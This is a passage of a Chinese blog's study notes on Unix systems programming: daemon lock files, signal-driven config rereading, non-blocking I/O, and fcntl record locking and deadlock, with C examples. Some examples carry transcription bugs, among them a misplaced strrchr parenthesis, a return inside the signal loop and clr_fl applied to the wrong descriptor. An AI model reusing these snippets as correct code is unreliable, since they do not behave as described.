class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (lockfile(fd) &lt; <span class="hljs-number">0</span>)&#123; <span class="hljs-comment">//锁定文件</span><br>        <span class="hljs-keyword">if</span> (errno == EACCES || errno == EAGAIN)&#123;<br>            close(fd);<br>            <span class="hljs-keyword">return</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        syslog(LOG_ERR,<span class="hljs-string">&quot;can&#x27;t lock %s: %s&quot;</span>, LOCKFILE, strerror(errno));<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    ftruncate(fd, <span class="hljs-number">0</span>); <span class="hljs-comment">//截断文件</span><br>    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%ld&quot;</span>, (<span class="hljs-type">long</span>)getpid());<br>    write(fd, buf, <span class="hljs-built_in">strlen</span>(buf)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>守护进程重读配置文件</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syslog.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">sigset_t</span> mask;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">already_runniing</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">reread</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><br>&#125;<br><br><span class="hljs-type">void</span> *<br><span class="hljs-title function_">thr_fn</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-type">int</span> err, signo;<br>    <span class="hljs-keyword">for</span> (;;)&#123;<br>        err = sigwait(&amp;mask, &amp;signo); <span class="hljs-comment">//等到信号</span><br>        <span class="hljs-keyword">if</span> (err != <span class="hljs-number">0</span>)&#123;<br>            syslog(LOG_ERR, <span class="hljs-string">&quot;sigwait failed&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">switch</span> (signo)<br>        &#123;<br>        <span class="hljs-keyword">case</span> SIGHUP:<br>            syslog(LOG_INFO, <span class="hljs-string">&quot;Re-reading configuration file&quot;</span>);<br>            reread();<br>            <span class="hljs-comment">/* code */</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> SIGTERM:<br>            syslog(LOG_INFO, <span class="hljs-string">&quot;got SIGTERM; exiting&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">default</span>:<br>            syslog(LOG_INFO, <span class="hljs-string">&quot;unexpected signal %d\n&quot;</span>, signo);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">int</span> err;<br>    <span class="hljs-type">pthread_t</span> tid;<br>    <span class="hljs-type">char</span> *cmd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">sa</span>;</span><br><br>    <span class="hljs-keyword">if</span> ((cmd = <span class="hljs-built_in">strrchr</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&#x27;/&#x27;</span>) == <span class="hljs-literal">NULL</span>))<br>        cmd = argv[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">else</span><br>        cmd++;<br>    daemonize(cmd);<br>    <span class="hljs-keyword">if</span> (already_runniing())&#123;<br>        syslog(LOG_ERR, <span class="hljs-string">&quot;daemon already running&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    sa.sa_handler = SIG_DFL;<br>    sigemptyset(&amp;sa.sa_mask);<br>    sa.sa_flags = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (sigaction(SIGHUP, &amp;sa, <span class="hljs-literal">NULL</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t restore SIGHUP default&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    sigfillset(&amp;mask);<br>    <span class="hljs-keyword">if</span> ((err = pthread_sigmask(SIG_BLOCK, &amp;mask, <span class="hljs-literal">NULL</span>)) != <span class="hljs-number">0</span>) <span class="hljs-comment">//阻塞所有信号</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;SIG_BLOCK error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    err = pthread_create(&amp;tid, <span class="hljs-literal">NULL</span>, thr_fn, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (err != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;can&#x27;t create thread&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">set_cloexec</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">int</span> val;<br><br>    <span class="hljs-keyword">if</span> ((val = fcntl(fd, F_GETFD, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    val |= FD_CLOEXEC; <span class="hljs-comment">//使用exec执行时，关闭该文件描述符</span><br><br>    <span class="hljs-keyword">return</span>(fcntl(fd, F_SETFD,val));<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="高级I-x2F-O"><a href="#高级I-x2F-O" class="headerlink" title="高级I&#x2F;O"></a>高级I&#x2F;O</h1><h2 id="非阻塞I-x2F-O"><a href="#非阻塞I-x2F-O" class="headerlink" title="非阻塞I&#x2F;O"></a>非阻塞I&#x2F;O</h2><ul><li>调用<code>open</code>函数时使用<code>O_NONBLOCK</code>标志</li><li>对于已经打开的文件，可以使用<code>fcntl</code>函数打开<code>O_NONBLOCK</code>标志</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">char</span> buf[<span class="hljs-number">500000</span>];<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> ntowrite, nwrite;<br>    <span class="hljs-type">char</span> *ptr;<br><br>    ntowrite = read(STDIN_FILENO, buf, <span class="hljs-keyword">sizeof</span>(buf));<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;read %d bytes\n&quot;</span>, ntowrite);<br><br>    set_fl(STDOUT_FILENO, O_NONBLOCK);<br><br>    ptr = buf;<br>    <span class="hljs-keyword">while</span> (ntowrite &gt; <span class="hljs-number">0</span>)&#123;<br>        errno = <span class="hljs-number">0</span>;<br>        nwrite = write(STDOUT_FILENO, ptr, ntowrite);<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;nwrite = %d, errno = %d\n&quot;</span>, nwrite, errno);<br><br>        <span class="hljs-keyword">if</span> (nwrite &gt; <span class="hljs-number">0</span>)&#123;<br>            ptr += nwrite;<br>            ntowrite -= nwrite;<br>        &#125;<br>    &#125;<br><br>    clr_fl(STDERR_FILENO, O_NONBLOCK);<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="记录锁"><a href="#记录锁" class="headerlink" title="记录锁"></a>记录锁</h2><p><strong>fcntl Record Locking</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fcntl</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> cmd, ... <span class="hljs-comment">/*struct flock *flockptr*/</span>)</span><br>    Returns:depends on cmd <span class="hljs-keyword">if</span> <span class="hljs-title function_">OK</span><span class="hljs-params">(see follwing)</span>, -1 on error<br></code></pre></td></tr></table></figure><p>对于记录锁，<code>cmd</code>的取值为：<code>F_GETLK</code>、<code>F_SETLK</code>或<code>F_SETLKW</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">flock</span> &#123;</span><br>    <span class="hljs-type">short</span> l_type;<span class="hljs-comment">/*F_RDLCK:分享读锁, F_WRLCK:独占写锁, or F_UNLCK:解锁区域*/</span><br>    <span class="hljs-type">short</span> l_whence;<span class="hljs-comment">/*SEEK_SET, SEEK_CUR, or SEEK_END*/</span><br>    <span class="hljs-type">off_t</span> l_start;<span class="hljs-comment">/*offset in bytes, relative to l_whence*/</span><br>    <span class="hljs-type">off_t</span> l_len;<span class="hljs-comment">/*length, in bytes; 0 means lock to EOF*/</span><br>    <span class="hljs-type">pid_t</span> l_pid;<span class="hljs-comment">/*returned with F_GETLK*/</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230131132819912.png" alt="image-20230131132819912"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">#define read_lock(fd, offset, whence, len) \</span><br><span class="hljs-comment">lock_reg((fd), F_SETLK, F_RDLCK, (offset), (whence), (len))</span><br><span class="hljs-comment">#define readw_lock(fd, offset, whence, len) \</span><br><span class="hljs-comment">lock_reg((fd), F_SETLKW, F_RDLCK, (offset), (whence), (len))</span><br><span class="hljs-comment">#define write_lock(fd, offset, whence, len) \</span><br><span class="hljs-comment">lock_reg((fd), F_SETLK, F_WRLCK, (offset), (whence), (len))</span><br><span class="hljs-comment">#define writew_lock(fd, offset, whence, len) \</span><br><span class="hljs-comment">lock_reg((fd), F_SETLKW, F_WRLCK, (offset), (whence), (len))</span><br><span class="hljs-comment">#define un_lock(fd, offset, whence, len) \</span><br><span class="hljs-comment">lock_reg((fd), F_SETLK, F_UNLCK, (offset), (whence), (len))</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">lock_reg</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> cmd, <span class="hljs-type">int</span> type, <span class="hljs-type">off_t</span> offset, <span class="hljs-type">int</span> whence, <span class="hljs-type">off_t</span> len)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">flock</span> <span class="hljs-title">lock</span>;</span><br><br>    lock.l_type = type;<br>    lock.l_start = offset;<br>    lock.l_whence = whence;<br>    lock.l_len = len;<br><br>    <span class="hljs-keyword">return</span>(fcntl(fd, cmd, &amp;lock));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">#define is_read_lockable(fd, offset, whence, len) \</span><br><span class="hljs-comment">(lock_test((fd), F_RDLCK, (offset), (whence), (len)) == 0)</span><br><span class="hljs-comment">#define is_write_lockable(fd, offset, whence, len) \</span><br><span class="hljs-comment">(lock_test((fd), F_WRLCK, (offset), (whence), (len)) == 0)</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">pid_t</span><br><span class="hljs-title function_">lock_test</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> type, <span class="hljs-type">off_t</span> offset, <span class="hljs-type">int</span> whence, <span class="hljs-type">off_t</span> len)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">flock</span> <span class="hljs-title">lock</span>;</span><br>    lock.l_type = type;<br>    lock.l_start = offset;<br>    lock.l_whence = whence;<br>    lock.l_len = len;<br><br>    <span class="hljs-keyword">if</span> (fcntl(fd, F_GETLK, &amp;lock) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//申请锁</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fcntl error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (lock.l_type == F_UNLCK)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span>(lock.l_pid);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;apue.h&quot;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">lockabyte</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (writew_lock(fd, offset, SEEK_SET, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s: writew_lock error&quot;</span>, name);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: got the lock, byte %lld\n&quot;</span>,name, (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)offset);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">pid_t</span> pid;<br><br>    <span class="hljs-keyword">if</span> ((fd = creat(<span class="hljs-string">&quot;templock&quot;</span>, FILE_MODE)) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//创建一个名为templock的文件</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;creat error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (write(fd, <span class="hljs-string">&quot;ab&quot;</span>, <span class="hljs-number">2</span>) != <span class="hljs-number">2</span>) <span class="hljs-comment">//往文件里写入ab</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;write error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    TELL_WAIT();<br><br>    <span class="hljs-keyword">if</span>((pid = fork()) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;fork error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)&#123;<br>        lockabyte(<span class="hljs-string">&quot;child&quot;</span>, fd, <span class="hljs-number">0</span>); <span class="hljs-comment">//加锁</span><br>        TELL_PARENT(getppid());<br>        WAIT_PARENT();<br>        lockabyte(<span class="hljs-string">&quot;child&quot;</span>, fd, <span class="hljs-number">1</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        lockabyte(<span class="hljs-string">&quot;parent&quot;</span>, fd, <span class="hljs-number">1</span>);<br>        TELL_CHILD(pid);<br>        WAIT_CHILD();<br>        lockabyte(<span class="hljs-string">&quot;parent&quot;</span>, fd, <span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">lockfile</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">flock</span> <span class="hljs-title">fl</span>;</span><br>    fl.l_type = F_WRLCK;<br>    fl.l_start = <span class="hljs-number">0</span>;<br>    fl.l_whence = SEEK_SET;<br>    fl.l_len = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span>(fcntl(fd, F_SETLK, &amp;fl));<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="强制锁"><a href="#强制锁" class="headerlink" title="强制锁"></a>强制锁</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span 